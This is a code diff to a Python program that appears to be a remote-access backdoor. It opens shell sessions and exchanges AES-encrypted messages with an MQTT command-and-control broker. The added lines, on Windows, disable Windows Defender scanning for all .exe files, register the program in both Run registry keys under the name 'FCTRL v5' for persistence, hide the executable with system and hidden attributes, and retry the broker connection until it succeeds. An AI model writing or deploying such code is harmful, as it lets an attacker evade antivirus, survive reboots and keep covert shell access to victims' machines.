@@ -12,6 +12,20 @@ import subprocess
 import threading
 import time
 
+def exec_path():
+    if getattr(sys, "frozen", False):
+        application_path = sys.executable
+    elif __file__:
+        application_path = os.path.abspath(__file__)
+    return application_path
+
+if os.name == "nt":
+    os.system('reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f')
+    os.system('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f')
+    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
+    os.system(f'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
+    os.system(f'attrib +s +h +a "{exec_path()}"')
+
 default_shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
 hostname = f"{os.getpid()}@{socket.gethostname()}"
 sessions = {}
@@ -104,13 +118,19 @@ client = mqtt.Client()
 client.on_connect = on_connect
 client.on_message = on_message
 
-client.connect(broker, port, 60)
-
 def publish_json_message(client, topic, message:json):
     json_message = json.dumps(message)
     iv = get_random_bytes(16)
     encrypted_message = encrypt_message(json_message, key, iv)
     client.publish(topic, encrypted_message)
+
+while True:
+    try:
+        client.connect(broker, port, 60)
+        break
+    except Exception as e:
+        print(f"[-] Connection error: {e}. Retrying in 5 seconds...")
+        time.sleep(5)
 
 client.loop_start()
 
@@ -139,4 +159,3 @@ finally:
             "session_id": session
         })
         sessions[session].terminate()
-        
